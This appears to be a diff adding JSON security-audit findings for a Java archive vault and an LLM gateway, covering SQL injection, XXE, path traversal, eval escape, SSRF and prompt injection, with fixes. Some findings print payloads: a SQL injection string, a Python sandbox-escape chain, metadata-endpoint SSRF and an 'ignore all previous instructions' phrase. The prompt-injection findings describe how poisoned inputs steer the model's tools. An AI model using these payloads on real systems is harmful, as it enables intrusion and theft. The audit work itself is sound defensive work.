+          "for": "a gateway in another partition that authenticates in front of this service",
+          "found": "nothing -- no sibling component references it"
+        }
+      ]
+    },
+    {
+      "title": "Blob key from the query string is passed to Path.resolve with no containment check",
+      "location": {
+        "path": "archive-vault-vertx/src/main/java/vault/store/BlobStore.java",
+        "symbol": "BlobStore.resolve",
+        "line": 37
+      },
+      "cwe": "CWE-22",
+      "class": "path traversal",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "BlobStore.java:36-38 is public Path resolve(String key) { return root.resolve(key); } with no normalize() and no prefix check; read (:41), write (:46), exists (:52) and delete (:56) all go through it. java.nio.file.Path.resolve returns the argument unchanged when it is absolute, so key=/etc/passwd resolves to /etc/passwd, and a relative ../../.. is collapsed by the OS. The sibling readPreset (:63-70) shows the safe pattern: the caller's name is only a key into an immutable PRESETS map (:20-23). INGRESS: ctx.queryParams().get(\"key\") at MainVerticle.java:106, handed to blobs.read at :112.",
+      "impact": "Any file the service UID can read is returned as the response body. Because the route is pre-authentication (the CWE-306 finding), this is an anonymous arbitrary file read, and /etc/vault/jwks.json (config.json:26) yields the HMAC secret, converting the read into token forgery against the authenticated half of the API.",
+      "recommendation": "Inside resolve: reject absolute keys and any '..' element, then Path candidate = root.resolve(key).normalize() and fail unless candidate.startsWith(root), so read/write/exists/delete all inherit the check.",
+      "triage": [
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The HTTP handler at MainVerticle.java:105-120 is the real caller."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "There is no mitigation on this path to credit; the mitigation that does exist is on readPreset, a different method."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Supervisor re-read BlobStore.java:15-72 independently; resolve is a bare root.resolve(key)."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress cited at MainVerticle.java:106."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "archive-vault-vertx/src/main/java/vault/store/BlobStore.java:37",
+          "archive-vault-vertx/src/main/java/vault/store/BlobStore.java:41",
+          "archive-vault-vertx/src/main/java/vault/store/BlobStore.java:46",
+          "archive-vault-vertx/src/main/java/vault/store/BlobStore.java:52",
+          "archive-vault-vertx/src/main/java/vault/store/BlobStore.java:56",
+          "archive-vault-vertx/src/main/java/vault/MainVerticle.java:112"
+        ],
+        "established_by": "BlobStore.java:37 -- root.resolve(key) with no normalization or containment",
+        "narrowed_by": "Only the read path has a live HTTP caller; write/delete are reached from RetentionSweeper with database-sourced keys, and MetadataRepository.insert has no call site in this tree"
+      },
+      "searched": [
+        {
+          "looked_in": "archive-vault-vertx (grep normalize|startsWith|toRealPath|canonical|sanitiz)",
+          "for": "any traversal guard or key allowlist",
+          "found": "only TokenVerifier.java:68 header.startsWith(\"Bearer \") and ManifestParser.java:33 Element.normalize(), neither of which is a path check; a prose comment at BlobStore.java:15 describes the expected key shape and nothing enforces it"
+        },
+        {
+          "looked_in": "archive-vault-vertx/src/main/java/vault/MainVerticle.java",
+          "for": "a validation handler mounted ahead of /v1/blobs",
+          "found": "nothing -- only BodyHandler at :62; the key is length-checked at :107 and never inspected for shape"
+        }
+      ]
+    },
+    {
+      "title": "tag query parameter is concatenated into a quoted SQL array literal",
+      "location": {
+        "path": "archive-vault-vertx/src/main/java/vault/store/MetadataRepository.java",
+        "symbol": "MetadataRepository.searchByTag",
+        "line": 67
+      },
+      "cwe": "CWE-89",
+      "class": "sql injection",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "MetadataRepository.java:64-70 builds the statement by concatenation, with the only transformation on the caller's value being tag.replace(\",\", \"','\") at :67 -- commas become quote-comma-quote, and single quotes are not escaped at all. Line 70 runs it through pool.query(), the unprepared simple-query path. The neighbouring listByOwner (:79-84) binds owner_id with preparedQuery and Tuple.of, and insert (:86-100) binds too, so the class knows the safe form. INGRESS: ctx.queryParams().get(\"tag\") at MainVerticle.java:131, passed to searchByTag at :135.",
+      "impact": "?tag=x'] OR TRUE OR tags && ARRAY[' drops the owner_id predicate and returns every owner's blob_key, title and owner_id -- owner_id is the only tenancy boundary this service enforces. The vault_app role holds SELECT/INSERT/UPDATE/DELETE across the schema (V1__init.sql:29), so the same parameter reaches vault.audit_events.",
+      "recommendation": "Split the tag list in Java and bind it: preparedQuery(\"... AND tags && $2::text[] ...\").execute(Tuple.of(ownerId, tagArray)); bind owner_id and the limit as well.",
+      "triage": [
+        {
+          "rule": "FP-04",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "pool.query() on a concatenated string is not safe library use; preparedQuery is used elsewhere in the same class."
+        },
+        {
+          "rule": "FP-05",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The comma replacement is a splitting convenience, not a mitigation, so nothing is being stretched."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Supervisor re-read MetadataRepository.java:60-85 and MainVerticle.java:130-138 independently."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress cited at MainVerticle.java:131."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "archive-vault-vertx/src/main/java/vault/store/MetadataRepository.java:67",
+          "archive-vault-vertx/src/main/java/vault/store/MetadataRepository.java:70",
+          "archive-vault-vertx/src/main/java/vault/MainVerticle.java:135"
+        ],
+        "established_by": "MetadataRepository.java:67 -- the tag value inlined between SQL quotes",
+        "narrowed_by": "The route is behind tokens::handle, so a valid token is required; ownerId is a long from the verified token and limit is clamped at MainVerticle.java:132-133, so tag is the only injectable term"
+      },
+      "searched": [
+        {
+          "looked_in": "archive-vault-vertx (grep searchByTag)",
+          "for": "a caller that allowlists the tag first",
+          "found": "one call site, MainVerticle.java:135, passing the raw parameter with only a null-to-empty swap"
+        },
+        {
+          "looked_in": "archive-vault-vertx/src/main/java/vault/store/MetadataRepository.java",
+          "for": "an escaping helper used anywhere in the class",
+          "found": "none -- every other statement uses preparedQuery with Tuple binding; searchByTag is the sole pool.query()"
+        }
+      ]
+    },
+    {
+      "title": "Manifest XML is parsed with a default DocumentBuilderFactory and the resolved entity is echoed back",
+      "location": {
+        "path": "archive-vault-vertx/src/main/java/vault/manifest/ManifestParser.java",
+        "symbol": "ManifestParser.ManifestParser",
+        "line": 23
+      },
+      "cwe": "CWE-611",
+      "class": "xml external entity",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "ManifestParser.java:22-27 sets namespaceAware, coalescing and ignoringComments and none of the entity controls -- no disallow-doctype-decl, no external-general-entities false, no XIncludeAware(false), no ACCESS_EXTERNAL_DTD. Line 32 parses the caller's string. text() at :56 returns the element's text content, which parse() puts into the JSON, and MainVerticle.java:150 writes that JSON straight back with ctx.json(parsed) -- so entity expansion is directly readable, not blind. setCoalescing(true) at :25 merges the expanded entity into one text node. INGRESS: ctx.body().asString() at MainVerticle.java:149 on POST /v1/manifests.",
+      "impact": "A DOCTYPE with a SYSTEM entity pointed at file:///etc/vault/jwks.json returns the HMAC signing secret in the response body, and an http SYSTEM URL turns the service into an SSRF proxy against internal hosts.",
+      "recommendation": "Set disallow-doctype-decl true on the factory before first use, plus external-general-entities and external-parameter-entities false, setXIncludeAware(false), setExpandEntityReferences(false) and empty ACCESS_EXTERNAL_DTD/ACCESS_EXTERNAL_SCHEMA.",
+      "triage": [
+        {
+          "rule": "FP-04",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "DocumentBuilderFactory.newInstance() without entity controls is the textbook unsafe configuration, not missing paranoia."
+        },
+        {
+          "rule": "FP-07",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Argued on file disclosure and SSRF; the billion-laughs variant is deliberately not claimed."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Supervisor re-read ManifestParser.java:20-35 and MainVerticle.java:147-154 independently."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress cited at MainVerticle.java:149."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "archive-vault-vertx/src/main/java/vault/manifest/ManifestParser.java:23",
+          "archive-vault-vertx/src/main/java/vault/manifest/ManifestParser.java:32",
+          "archive-vault-vertx/src/main/java/vault/MainVerticle.java:149"
+        ],
+        "established_by": "ManifestParser.java:22-27 -- a factory configured for namespaces and comments but not for entities",
+        "narrowed_by": "The route is behind tokens::handle, so a valid token is required; the catch at MainVerticle.java:151-152 removes error-based oracles but not the successful echo"
+      },
+      "searched": [
+        {
+          "looked_in": "archive-vault-vertx (grep setFeature|setXIncludeAware|ACCESS_EXTERNAL|EntityResolver|FEATURE_SECURE)",
+          "for": "any XXE hardening anywhere in the partition",
+          "found": "zero hits"
+        },
+        {
+          "looked_in": "archive-vault-vertx/pom.xml",
+          "for": "a hardened XML library that would change the default entity behaviour",
+          "found": "no XML dependency at all -- the parser is the JDK 17 JAXP default (maven.compiler.release 17, pom.xml:12)"
+        }
+      ]
+    },
+    {
+      "title": "verifyLegacy discards the signature and returns unverified claims",
+      "location": {
+        "path": "archive-vault-vertx/src/main/java/vault/auth/TokenVerifier.java",
+        "symbol": "TokenVerifier.verifyLegacy",
+        "line": 58
+      },
+      "cwe": "CWE-347",
+      "class": "improper verification of cryptographic signature",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "TokenVerifier.java:54-59 splits the token, rebuilds it at :56 as parts[0] + \".\" + parts[1] + \".\" -- an empty signature segment -- and calls Jwts.parser().build().parseUnsecuredClaims(unsigned) at :58, JJWT's explicit alg:none entry point. It also drops the requireIssuer/requireAudience constraints that the real verify() applies at :41-42. legacyEnabled() at :61 and the legacyTokens config key at :29 are the half-built wiring around it.",
+      "impact": "Any caller wiring this in accepts a self-minted header/payload pair as identity, and that payload feeds ctx.put(\"ownerId\", ...) -- the sole tenancy boundary for every metadata query. No route reaches it today (handle() at :74 calls verify()), so it is a latent primitive rather than a live bypass, which is what caps this at medium.",
+      "recommendation": "Delete verifyLegacy, legacyEnabled and the legacyTokens key; if a 1.x fleet genuinely remains, terminate it on a separate network-restricted listener rather than a method one line from the live verifier.",
+      "triage": [
+        {
+          "rule": "FP-03",
+          "answer": "HOLDS",
+          "reason": "Stated plainly: not triggerable over HTTP in this build, because no route reaches it. It is retained only under FP-08 and the severity reflects exactly that."
+        },
+        {
+          "rule": "FP-06",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Not dismissed for being labelled legacy -- reachability was traced and the result (zero call sites, flag false at config.json:27) is reported explicitly."
+        },
+        {
+          "rule": "FP-08",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Rule 08 keeps a fundamentally broken verification in a function's own logic valid even with no caller."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Supervisor re-read TokenVerifier.java:20-82 and config.json:23-28 independently."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "NOT_APPLICABLE",
+          "reason": "No live ingress exists; the absence is stated rather than a plausible-looking one invented."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "archive-vault-vertx/src/main/java/vault/auth/TokenVerifier.java:56",
+          "archive-vault-vertx/src/main/java/vault/auth/TokenVerifier.java:58",
+          "archive-vault-vertx/src/main/java/vault/auth/TokenVerifier.java:61",
+          "archive-vault-vertx/src/main/resources/config.json:27"
+        ],
+        "established_by": "TokenVerifier.java:56-58 -- the signature segment is emptied and the token parsed as unsecured",
+        "narrowed_by": "No caller anywhere in the partition, and config.json:27 sets legacyTokens false"
+      },
+      "searched": [
+        {
+          "looked_in": "archive-vault-vertx (grep verifyLegacy|legacyEnabled|legacyTokens|parseUnsecured)",
+          "for": "a call site that would make this reachable and raise it to high",
+          "found": "only the declarations themselves and config.json:27 -- no caller"
+        },
+        {
+          "looked_in": "archive-vault-vertx/src/main/java/vault/auth/TokenVerifier.java and pom.xml",
+          "for": "whether the PRIMARY path has an alg-confusion or missing-expiry weakness, which would change the picture",
+          "found": "it does not -- jjwt 0.12.5 with verifyWith(SecretKey) and parseSignedClaims pins HMAC and enforces exp, and requireIssuer/requireAudience are both set at :41-42"
+        }
+      ]
+    },
+    {
+      "title": "The analytics role is granted ALL PRIVILEGES on every table including the audit trail",
+      "location": {
+        "path": "archive-vault-vertx/src/main/resources/db/migration/V1__init.sql",
+        "symbol": "GRANT vault_analytics",
+        "line": 34
+      },
+      "cwe": "CWE-732",
+      "class": "excessive privilege",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "V1__init.sql:32 states the intent -- 'Analytics reads the same tables through Metabase' -- and :34 grants ALL PRIVILEGES ON ALL TABLES IN SCHEMA vault TO vault_analytics: INSERT, UPDATE, DELETE, TRUNCATE, REFERENCES and TRIGGER on vault.documents and vault.audit_events. The contrast is five lines up: :29 enumerates SELECT, INSERT, UPDATE, DELETE for the application role, so the author knew how to name privileges and did not here.",
+      "impact": "vault_analytics is a BI credential shared across a Metabase deployment -- the widest-distributed credential touching this data. Its holder can TRUNCATE vault.audit_events and destroy the retention audit trail RetentionSweeper writes, forge audit rows with an arbitrary actor, or rewrite owner_id on documents to reassign tenancy, since owner_id is the only authorization boundary the application enforces.",
+      "recommendation": "GRANT SELECT ON ALL TABLES IN SCHEMA vault TO vault_analytics, plus ALTER DEFAULT PRIVILEGES so later migrations inherit read-only rather than nothing.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "An affirmatively excessive grant that contradicts its own stated intent, not an absent safeguard."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Supervisor re-read V1__init.sql:25-34 independently; line 34 is the file's final statement."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "NOT_APPLICABLE",
+          "reason": "Not a data-flow finding: the boundary is the standing privilege, not tainted input."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "archive-vault-vertx/src/main/resources/db/migration/V1__init.sql:34"
+        ],
+        "established_by": "V1__init.sql:34 -- ALL PRIVILEGES where the neighbouring grant enumerates",
+        "narrowed_by": "The verticle itself connects as vault_app (config.json:11), so this is an external BI credential, not an application-path issue"
+      },
+      "searched": [
+        {
+          "looked_in": "archive-vault-vertx/src/main/resources/db/migration/",
+          "for": "a later migration revoking or narrowing the grant",
+          "found": "V1__init.sql is the only migration in the tree; nothing revokes it"
+        },
+        {
+          "looked_in": "archive-vault-vertx/src/main/resources/config.json and MainVerticle.bootstrap",
+          "for": "whether the application connects as vault_analytics, which would change the exploit path",
+          "found": "it connects as vault_app with the password from VAULT_DB_PASSWORD -- vault_analytics is a separate external consumer"
+        }
+      ]
+    },
+    {
+      "title": "Client-supplied model_uri reaches mlflow.pyfunc.load_model with the curation allowlist never enforced",
+      "location": {
+        "path": "promptbridge-mlflow/bridge/registry.py",
+        "symbol": "ModelCache.get",
+        "line": 46
+      },
+      "cwe": "CWE-502",
+      "class": "unsafe deserialization",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "registry.py:36-46: get() resolves uri = uri or self.default_uri (:38) and calls mlflow.pyfunc.load_model(uri) (:46) without ever calling is_curated. is_curated (:22-24) exists and has exactly one caller, warm() at :28-30, where the uri was just built from a prefix so the test is tautological. server.py:94 passes payload.get(\"model_uri\") straight in. allowed_prefixes (config.yaml:21-23) is therefore dead configuration. INGRESS: payload = await request.json() at server.py:76, field model_uri read at server.py:94.",
+      "impact": "A caller holding a gateway key names an arbitrary artifact URI; load_model resolves the MLmodel descriptor, unpickles the cloudpickle flavor payload and imports any code_paths modules it declares, executing attacker Python in the gateway process. The loaded object is then cached under that URI and answers every predict() in the request, so the attacker also controls the triage verdict.",
+      "recommendation": "Enforce the check that already exists -- reject in get() unless is_curated(uri), with an anchored prefix comparison -- or better, accept a short model name and map it to a curated URI server-side.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The intended control exists and is simply not wired into the path that needs it."
+        },
+        {
+          "rule": "FP-05",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "No bypass invented -- the mitigation never runs on this path."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Supervisor re-read registry.py:18-50 and server.py:75-95 independently; get() contains no is_curated call."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress cited at server.py:76."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "promptbridge-mlflow/bridge/registry.py:46",
+          "promptbridge-mlflow/bridge/server.py:94"
+        ],
+        "established_by": "registry.py:38-46 -- the uri is defaulted and loaded, never validated",
+        "narrowed_by": "Requires the X-Bridge-Key header (server.py:39-46), whose only shipped values are the literals in config.yaml:15,17"
+      },
+      "searched": [
+        {
+          "looked_in": "promptbridge-mlflow (grep is_curated / allowed_prefixes)",
+          "for": "a call site that validates the URI before the load",
+          "found": "only the definition at registry.py:24 and the tautological use inside warm() at :30; nothing on the request path"
+        },
+        {
+          "looked_in": "promptbridge-mlflow/bridge/server.py",
+          "for": "request-body schema validation that would drop or constrain model_uri",
+          "found": "nothing -- BridgeKeyMiddleware only compares a header, and payload.get() is used raw throughout score()"
+        }
+      ]
+    },
+    {
+      "title": "calculator tool runs eval() on model-emitted text in an escapable empty-builtins sandbox",
+      "location": {
+        "path": "promptbridge-mlflow/bridge/tools.py",
+        "symbol": "ToolBox.calculator",
+        "line": 48
+      },
+      "cwe": "CWE-95",
+      "class": "eval injection",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "tools.py:44-49: eval(expression, {\"__builtins__\": {}}, dict(_SAFE_MATH)). Emptying __builtins__ is not a sandbox -- ().__class__.__bases__[0].__subclasses__() walks from a literal to a class whose __init__.__globals__ carries a live __builtins__, restoring __import__. The expression is never written by a human: dispatch() (:89-108) extracts it from the model's completion via CALL_RE (:14) and calls handler(**args) at :104. config.yaml:35 lists calculator among the enabled tools, and registry() at :80-87 filters on exactly that set. INGRESS: server.py:76 request body -> prompt at server.py:92 -> completion at :95 -> toolbox.dispatch at :100.",
+      "impact": "Arbitrary command execution as the gateway process, which holds the retrieval DSN (config.yaml:27) and any cloud role attached to it. The prompt-injection findings are the delivery mechanism: attacker text in the request steers the model into emitting one CALL calculator line.",
+      "recommendation": "Replace eval with ast.parse(expression, mode='eval') plus a node-type whitelist, or a dedicated arithmetic library. Never eval a string that originated in model output.",
+      "triage": [
+        {
+          "rule": "FP-04",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "eval with an emptied __builtins__ is a known-broken pattern, not standard safe library use."
+        },
+        {
+          "rule": "FP-05",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The subclass-walk escape is documented CPython behaviour, not an invented bypass."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Supervisor re-read tools.py:14-30, :44-49, :79-108 and config.yaml:32-37 independently."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress cited at server.py:76 via :92/:95/:100."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "promptbridge-mlflow/bridge/tools.py:48",
+          "promptbridge-mlflow/bridge/tools.py:104",
+          "promptbridge-mlflow/bridge/server.py:100",
+          "promptbridge-mlflow/bridge/config.yaml:35"
+        ],
+        "established_by": "tools.py:48 -- eval on a caller-supplied string",
+        "narrowed_by": "The expression must arrive as a CALL calculator line matching CALL_RE; the loop runs at most max_tool_steps=6 times (config.yaml:5)"
+      },
+      "searched": [
+        {
+          "looked_in": "promptbridge-mlflow/bridge/guardrails.py and grep 'guardrails.'",
+          "for": "validation of tool arguments or of the completion before dispatch",
+          "found": "the only guardrails calls in the tree are server.py:68,69 (redact, on the audit log) and server.py:85 (body); nothing touches tool arguments"
+        },
+        {
+          "looked_in": "promptbridge-mlflow/bridge/tools.py:79-87 and config.yaml:32-37",
+          "for": "whether calculator is actually enabled, which would kill the finding if it were not",
+          "found": "registry() includes it and config.yaml:35 enables it -- live in the shipped configuration"
+        }
+      ]
+    },
+    {
+      "title": "http_fetch performs an unrestricted redirect-following GET and returns the body to the caller",
+      "location": {
+        "path": "promptbridge-mlflow/bridge/tools.py",
+        "symbol": "ToolBox.http_fetch",
+        "line": 36
+      },
+      "cwe": "CWE-918",
+      "class": "server side request forgery",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "tools.py:33-41 opens httpx.Client(follow_redirects=True) and GETs the model-supplied url with no host check, returning response.text[:4000]. The sibling probe_status (:67-75) does check -- guardrails.allowed_host(url, self.allowed_hosts) at :69 -- and the shipped config enables the unguarded one and not the guarded one: config.yaml:33-36 lists http_fetch, calculator and lookup_runbook, and registry() at :87 filters probe_status out. The fetched body is returned to the requester at server.py:112 and spliced into the next prompt at server.py:105. INGRESS: server.py:76 request body -> :92 prompt -> :95 completion -> tools.py:36.",
+      "impact": "A read SSRF: cloud instance-metadata credentials at 169.254.169.254, internal admin pages and unauthenticated internal services are all fetched and up to 4000 characters returned verbatim to the caller. follow_redirects=True means an externally hosted URL can bounce to a link-local address.",
+      "recommendation": "Call guardrails.allowed_host in http_fetch exactly as probe_status does, set follow_redirects=False or re-validate each hop, and block loopback/link-local/RFC1918 after DNS resolution.",
+      "triage": [
+        {
+          "rule": "FP-05",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "No mitigation on this path is being stretched -- the working allowlist lives on a different, disabled tool."
+        },
+        {
+          "rule": "FP-07",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Impact is unauthorized read of internal resources, not exhaustion."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Supervisor re-read tools.py:32-75, :79-87 and config.yaml:32-41 independently; the enabled/guarded asymmetry is exactly as claimed."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress cited at server.py:76."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "promptbridge-mlflow/bridge/tools.py:36",
+          "promptbridge-mlflow/bridge/tools.py:104",
+          "promptbridge-mlflow/bridge/server.py:100",
+          "promptbridge-mlflow/bridge/server.py:112"
+        ],
+        "established_by": "tools.py:33-36 -- a GET with no host validation on a tool that config.yaml:34 enables",
+        "narrowed_by": "httpx supports only http/https, so file:// and gopher:// are out of reach; the body is truncated to 4000 characters at tools.py:41"
+      },
+      "searched": [
+        {
+          "looked_in": "promptbridge-mlflow (grep allowed_host)",
+          "for": "a host allowlist applied to http_fetch",
+          "found": "guardrails.allowed_host exists and works, but its only call site is tools.py:69 inside probe_status"
+        },
+        {
+          "looked_in": "promptbridge-mlflow/bridge/config.yaml:32-41",
+          "for": "whether the guarded tool is the one actually enabled, which would make this moot",
+          "found": "the opposite -- probe_status (guarded) is absent from enabled while http_fetch (unguarded) is listed"
+        }
+      ]
+    },
+    {
+      "title": "The prompt scrubber is applied to report.body alone while operator_note lands in the system turn",
+      "location": {
+        "path": "promptbridge-mlflow/bridge/server.py",
+        "symbol": "Gateway.score",
+        "line": 85
+      },
+      "cwe": "CWE-1427",
+      "class": "prompt injection",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "server.py:85 rewrites only report[\"body\"] through guardrails.strip_control_instructions. server.py:90 reads payload.get(\"operator_note\", \"\") straight from the request and prompts.py:51 interpolates it into SYSTEM_TEMPLATE at prompts.py:19 -- below the 'House rules, which always win' block. reporter, service and started_at go through build_user (prompts.py:57-59) with no scrubbing at all. The scrubber is also line-anchored (guardrails.py:8, ^\\s*), so 'Please ignore all previous instructions' does not match. Note too that index.search runs at server.py:79 on the UNsanitised body, before line 85. INGRESS: payload = await request.json() at server.py:76; operator_note read at server.py:90.",
+      "impact": "A caller writes system-level instructions on every request, turning the tool loop at server.py:99-107 into an attacker-directed executor that reaches the eval sink and the unrestricted fetch, with results returned at server.py:112.",
+      "recommendation": "Stop taking operator_note from the request body -- a per-request field must never occupy a system-prompt slot -- and scrub or charset-restrict every free-text field that reaches a template. Treat the scrubber as best-effort; the real control is authorizing tool calls server-side.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "A control exists and is applied to the wrong subset of the untrusted input; that is a broken control, not absent hygiene."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The mitigation cannot be credited for fields it never runs on."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Supervisor re-read server.py:75-95, prompts.py:8-25 and :32-61, and guardrails.py:1-34 independently."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress cited at server.py:76 and :90."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "promptbridge-mlflow/bridge/server.py:85",
+          "promptbridge-mlflow/bridge/server.py:90",
+          "promptbridge-mlflow/bridge/prompts.py:19",
+          "promptbridge-mlflow/bridge/prompts.py:51",
+          "promptbridge-mlflow/bridge/prompts.py:57",
+          "promptbridge-mlflow/bridge/prompts.py:58",
+          "promptbridge-mlflow/bridge/prompts.py:59"
+        ],
+        "established_by": "server.py:85 sanitising exactly one key while four other request-controlled strings reach the templates",
+        "narrowed_by": "Requires a valid gateway key; body is still truncated to 12000 chars by guardrails.py:34"
+      },
+      "searched": [
+        {
+          "looked_in": "promptbridge-mlflow (grep operator_note)",
+          "for": "sanitisation or a config-only source that would mean it is not request-controlled",
+          "found": "four hits -- server.py:90 reads it from the payload, prompts.py:19/:47/:51 pass it through. No filtering anywhere"
+        },
+        {
+          "looked_in": "promptbridge-mlflow (grep 'guardrails.') and prompts.py:32-61",
+          "for": "a second sanitisation call covering reporter/service/started_at or the assembled prompt",
+          "found": "only server.py:68,69 (redact, on the audit log after the fact) and server.py:85 (body); build_user formats raw dict values with no escaping"
+        }
+      ]
+    },
+    {
+      "title": "Retrieved runbook chunks are interpolated into the system prompt verbatim",
+      "location": {
+        "path": "promptbridge-mlflow/bridge/prompts.py",
+        "symbol": "render_context",
+        "line": 41
+      },
+      "cwe": "CWE-1427",
+      "class": "indirect prompt injection",
+      "severity": "high",
+      "status": "probable",
+      "evidence": "retrieval.py:3-4 documents the corpus provenance: 'Runbook chunks come from the internal wiki and from the resolution notes people type when they close a ticket, so the table grows on its own.' retrieval.py:45 returns title/source_url/text rows; server.py:79 calls search() and server.py:87 passes the documents into build_system; prompts.py:32-44 formats them into the {context} slot at prompts.py:17, inside SYSTEM_TEMPLATE. No scrubbing is applied between the two -- server.py:85 sanitises report.body only, and it runs after the search call. INGRESS: retrieval.py:45, the chunks table rows.",
+      "impact": "Whoever can close a ticket can write into the system prompt, and because the retrieval query is the incident body (server.py:80) an attacker also steers which poisoned chunk is retrieved. The injected chunk then drives the tool loop into eval and the unrestricted fetch.",
+      "recommendation": "Fence retrieved content in an explicit untrusted-data delimiter, run it through strip_control_instructions as report.body is, and state in the house rules that excerpts are data and never instructions. The durable fix is to stop letting model output authorize tool calls unilaterally.",
+      "triage": [
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The corpus being user-writable is stated by the module's own docstring, not assumed."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "UNKNOWN",
+          "reason": "The component that writes the chunks table is outside this partition, so the write step could not be read here. That is why status is probable rather than confirmed."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Supervisor re-read retrieval.py, prompts.py:8-25/:32-61 and server.py:75-95 independently."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress cited at retrieval.py:45."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "promptbridge-mlflow/bridge/prompts.py:38",
+          "promptbridge-mlflow/bridge/prompts.py:41",
+          "promptbridge-mlflow/bridge/prompts.py:17",
+          "promptbridge-mlflow/bridge/server.py:79",
+          "promptbridge-mlflow/bridge/server.py:87"
+        ],
+        "established_by": "prompts.py:32-44 -- doc fields formatted directly into the system template",
+        "narrowed_by": "The chunk must rank for the attacker's own query (retrieval.py:33-35), and the write path lives outside this partition"
+      },
+      "searched": [
+        {
+          "looked_in": "promptbridge-mlflow/bridge/server.py:75-113",
+          "for": "sanitisation applied to documents between search() and build_system",
+          "found": "nothing -- line 85 sanitises report['body'] only and runs after the search at :79"
+        },
+        {
+          "looked_in": "promptbridge-mlflow/bridge/prompts.py:8-25",
+          "for": "a delimiter or an instruction telling the model that excerpts are data, not commands",
+          "found": "{context} is dropped inline at :17 with only '### title (url)' headers; the house rules at :11-14 say nothing about ignoring instructions inside excerpts"
+        }
+      ]
+    },
+    {
+      "title": "Gateway API keys are hardcoded in the config the service loads by default",
+      "location": {
+        "path": "promptbridge-mlflow/bridge/config.yaml",
+        "symbol": "auth.clients",
+        "line": 15
+      },
+      "cwe": "CWE-798",
+      "class": "hardcoded credentials",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "config.yaml:15 and :17 hold the literal keys vk_console_placeholder_0000 and vk_batch_placeholder_0000. server.py:23 sets CONFIG_PATH to the in-package config.yaml and load_config(path=None) at :26-28 falls back to it; both call sites -- create_app at :134 and main at :159 -- pass no path, so this file always wins. server.py:37 builds the client map from it and :42 is the only authentication comparison in the service. config.yaml:2 binds 0.0.0.0.",
+      "impact": "Anyone with read access to the source, or who guesses the placeholder pattern, holds a valid X-Bridge-Key on a service listening on all interfaces. That key is the sole precondition for the model-URI deserialization, the eval sink and the SSRF, so it is what makes those network-reachable rather than insider-only.",
